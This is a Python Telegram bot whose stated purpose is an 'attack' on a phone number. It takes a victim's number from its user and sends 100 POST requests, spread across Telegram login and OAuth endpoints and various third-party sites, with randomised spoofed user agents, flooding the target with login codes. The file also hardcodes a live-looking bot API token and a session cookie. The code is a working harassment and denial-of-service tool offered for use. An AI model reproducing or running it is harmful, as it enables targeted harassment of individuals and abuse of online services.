import telebot
from telebot import types
from fake_useragent import UserAgent
import requests
import logging
import random
import string

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

API_TOKEN = '7307408961:AAGNtngnrb5EYoEexOZ603-dr8ZpdpWBgZA'

bot = telebot.TeleBot(API_TOKEN)

def save_user_id(user_id):

    try:
        with open("users.txt", "r") as file:
            user_ids = file.read().splitlines()
    except FileNotFoundError:
 
        with open("users.txt", "w") as file:
            user_ids = []  

    if str(user_id) not in user_ids:
        with open("users.txt", "a") as file:
            file.write(f"{user_id}\n")


@bot.message_handler(commands=['start'])
def send_welcome(message):
    save_user_id(message.chat.id)
    markup = types.InlineKeyboardMarkup()
    button_channel = types.InlineKeyboardButton("⚙️ Settings", callback_data="channel")
    button_flood = types.InlineKeyboardButton("📱 SNOS TELEGRAMM", callback_data="flood")
    markup.add(button_channel, button_flood)
    bot.reply_to(message, "Здарова, нажми на кнопку", reply_markup=markup)
    logging.info(f'User {message.chat.id} started the bot.')

@bot.callback_query_handler(func=lambda call: call.data == "channel")
def callback_channel(call):
    bot.send_message(call.message.chat.id, "Channel - нету\nРазраб этой хуйни -malvi ", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "flood")
def callback_flood(call):
    msg = bot.send_message(call.message.chat.id, "Введи номер телефона:")
    bot.register_next_step_handler(msg, send_flood)

def send_flood(message):
    phone_number = message.text
    send_flood_requests(phone_number)
    bot.send_message(message.chat.id, f"Флуд на номер {phone_number} окончен.")
    logging.info(f'Flood sent to {phone_number}')

def send_flood_requests(phone_number):
    ua = UserAgent()
    services = [
        {
            'url': "https://my.telegram.org/auth/send_password",
            'headers': {
                'authority': 'my.telegram.org',
                'method': 'POST',
                'path': '/auth/send_password',
                'scheme': 'https',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '20',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://my.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://my.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?1',
                'Sec-Ch-Ua-Platform': '"Android"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': phone_number
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': phone_number,
                'bot_id': '5444323279',
                'origin': 'https://fragment.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': phone_number,
                'bot_id': '5731754199',
                'origin': 'https://steam.kupikod.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': phone_number,
                'bot_id': '210944655',
                'origin': 'https://combot.org',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '1199558236',
                'origin': 'https://bot-t.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '5709824482',
                'origin': 'https://lzt.market',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '1803424014',
                'origin': 'https://ru.telegram-store.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '5463728243',
                'origin': 'https://www.spot.uz',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://oauth.telegram.org/auth/request",
            'headers': {
                'authority': 'oauth.telegram.org',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Length': '17',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                'Origin': 'https://oauth.telegram.org',
                'Priority': 'u=1, i',
                'Referer': 'https://oauth.telegram.org/auth',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': ua.random,
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': f'{phone_number}',
                'bot_id': '6708902161',
                'origin': 'https://ourauthpoint777.com',
                'request_access': 'write',
                'return_to': 'https://fragment.com/'
            }
        },
        {
              'url': "https://oauth.telegram.org/auth/request",
              'headers': {
                  'authority': 'oauth.telegram.org',
                  'method': 'POST',
                  'path': '/auth/request',
                  'scheme': 'https',
                  'Accept': '*/*',
                  'Accept-Encoding': 'gzip, deflate, br, zstd',
                  'Accept-Language': 'ru-RU,ru;q=0.9',
                  'Content-Length': '17',
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                  'Origin': 'https://oauth.telegram.org',
                  'Priority': 'u=1, i',
                  'Referer': 'https://oauth.telegram.org/auth',
                  'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                  'Sec-Ch-Ua-Mobile': '?0',
                  'Sec-Ch-Ua-Platform': '"Windows"',
                  'Sec-Fetch-Dest': 'empty',
                  'Sec-Fetch-Mode': 'cors',
                  'Sec-Fetch-Site': 'same-origin',
                  'User-Agent': ua.random,
                  'X-Requested-With': 'XMLHttpRequest'
              },
              'data': {
                  'phone': f'{phone_number}',
                  'bot_id': '1852523856',
                  'origin': 'https://cabinet.presscode.app',
                  'request_access': 'write',
                  'return_to': 'https://fragment.com/'
              }
         },
         {     
              'url': "https://oauth.telegram.org/auth/request",
              'headers': {
                  'authority': 'oauth.telegram.org',
                  'method': 'POST',
                  'path': '/auth/request',
                  'scheme': 'https',
                  'Accept': '*/*',
                  'Accept-Encoding': 'gzip, deflate, br, zstd',
                  'Accept-Language': 'ru-RU,ru;q=0.9',
                  'Content-Length': '17',
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Cookie': 'stel_ssid=13a34b19e40ac41faa_2032885696268358521',
                  'Origin': 'https://oauth.telegram.org',
                  'Priority': 'u=1, i',
                  'Referer': 'https://oauth.telegram.org/auth',
                  'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                  'Sec-Ch-Ua-Mobile': '?0',
                  'Sec-Ch-Ua-Platform': '"Windows"',
                  'Sec-Fetch-Dest': 'empty',
                  'Sec-Fetch-Mode': 'cors',
                  'Sec-Fetch-Site': 'same-origin',
                  'User-Agent': ua.random,
                  'X-Requested-With': 'XMLHttpRequest'
              },
              'data': {
                  'phone': f'{phone_number}',
                  'bot_id': '366357143',
                  'origin': 'https://www.botobot.ru',
                  'request_access': 'write',
                  'return_to': 'https://fragment.com/'
            }
        },
        {
            'url': "https://zelenka.guru/auth/request",
            'headers': {
                'authority': 'zelenka.guru',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://zelenka.guru',
                'Referer': 'https://zelenka.guru/login',
                'User-Agent': ua.random
            },
            'data': {
                'phone': phone_number
            }
        },
        {
            'url': "https://lolz.market/auth/request",
            'headers': {
                'authority': 'lolz.market',
                'method': 'POST',
                'path': '/auth/request',
                'scheme': 'https',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'ru-RU,ru;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://lolz.market',
                'Referer': 'https://lolz.market/login',
                'User-Agent': ua.random
            },
            'data': {
                'phone': phone_number
            }
        },
 {
        'url': "https://ourauthpoint777.com/auth/request",
        'headers': {
            'authority': 'ourauthpoint777.com',
            'method': 'POST',
            'path': '/auth/request',
            'scheme': 'https',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ru-RU,ru;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://ourauthpoint777.com',
            'Referer': 'https://ourauthpoint777.com/login',
            'User-Agent': ua.random
        },
        'data': {
            'phone': phone_number
        }
    },
    {
        'url': "https://telegram.org/auth/request",
        'headers': {
            'authority': 'telegram.org',
            'method': 'POST',
            'path': '/auth/request',
            'scheme': 'https',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ru-RU,ru;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://telegram.org',
            'Referer': 'https://telegram.org/login',
            'User-Agent': ua.random
        },
        'data': {
            'phone': phone_number
        }
    },
 {
        'url': "https://ru.telegram-store.com/auth/request",
        'headers': {
            'authority': 'ru.telegram-store.com',
            'method': 'POST',
            'path': '/auth/request',
            'scheme': 'https',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ru-RU,ru;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://ru.telegram-store.com',
            'Referer': 'https://ru.telegram-store.com/login',
            'User-Agent': ua.random
        },
        'data': {
            'phone': phone_number
        }
    },
    {
    'url': "https://ton.place/auth/request",
    'headers': {
        'authority': 'ton.place',
        'method': 'POST',
        'path': '/auth/request',
        'scheme': 'https',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://ton.place',
        'Referer': 'https://ton.place/login',
        'User-Agent': ua.random
    },
    'data': {
        'phone': phone_number
    }
}



    ]    

    for _ in range(100):  # Отправить по 5 запросов
        service = random.choice(services)  # Случайно выбирает сервис
        try:
            response = requests.post(service['url'], headers=service['headers'], data=service['data'])
            logging.info(f'Service {service["url"]} responded with status {response.status_code}')
        except Exception as e:
            logging.error(f"Failed to send request to {service['url']}: {e}")


@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Привет! Отправь мне номер телефона, чтобы начать атаку.")

# Обработчик входящего номера телефона
@bot.message_handler(func=lambda message: True)
def handle_phone_number(message):
    phone_number = message.text.strip()
    if phone_number.isdigit():
        bot.reply_to(message, f"Начинаю атаку на номер {phone_number}...")
        send_flood_requests(phone_number)
        bot.reply_to(message, f"Атака завершена.")
    else:
        bot.reply_to(message, "Пожалуйста, отправь правильный номер телефона.")

# Запуск бота
bot.polling()
